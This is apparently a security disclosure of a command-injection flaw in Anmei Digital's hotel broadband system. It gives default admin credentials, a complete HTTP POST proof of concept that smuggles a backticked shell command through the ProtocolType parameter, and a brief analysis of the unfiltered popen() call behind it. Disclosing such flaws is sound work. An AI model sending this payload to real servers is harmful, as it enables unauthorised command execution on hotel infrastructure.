## Affected version: 
Anmei Digital hotel broadband operating system has a command execution vulnerability

## Official website:
http://www.amttgroup.com/


## Vulnerability File:
/manager/system/nlog_down.php

## Description:
Amie century (Beijing) technology co., LTD. (http://www.amttgroup.com/) is a digital service solution provider for star hotel operating services and digital content.
Anmei Digital hotel broadband operating system has a command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.

Status: CRITICAL

## Vulnerability recurrence

The login page is shown in the following figure
administrator/admin (because it is executed as a background command)
![image](https://github.com/user-attachments/assets/5f2286c2-e3c7-4c31-8807-2dd02dbba54b)

POC

Since the popen execution command does not echo, write the command to 1.txt through $ProtocolType
```
POC
POST /manager/system/nlog_down.php HTTP/1.1
Host: 127.0.0.1:6070
Cookie: PHPSESSID=4ejs18q1f7o2e1c96jih9pkuu3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
Priority: u=1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 104

UserMac=22&AccountID=11&UserVlan=1&ProtocolType=12`whoami>1.txt`2
```
![image](https://github.com/user-attachments/assets/705fe938-4d89-4228-abb6-cb1c81c5d80e)


Access the file /manager/system/1.txt to see the results of whiami's execution
![image](https://github.com/user-attachments/assets/fc54a0bb-cfbf-4ab5-b25a-c26a4d6a8e4a)


## code analysis:

In nlog_down.php, there is no filtering because the $ProtocolType parameter is controllable and the parameter is directly spliced ​​into the $cmd variable.
![image](https://github.com/user-attachments/assets/e71378cb-908a-40f1-95f5-f50d79a412c4)
$cmd is finally brought into the popen() function to execute the command, causing the command to be executed
![image](https://github.com/user-attachments/assets/54a7b8f6-271e-4d5b-ada0-d4e4c09f84ac)



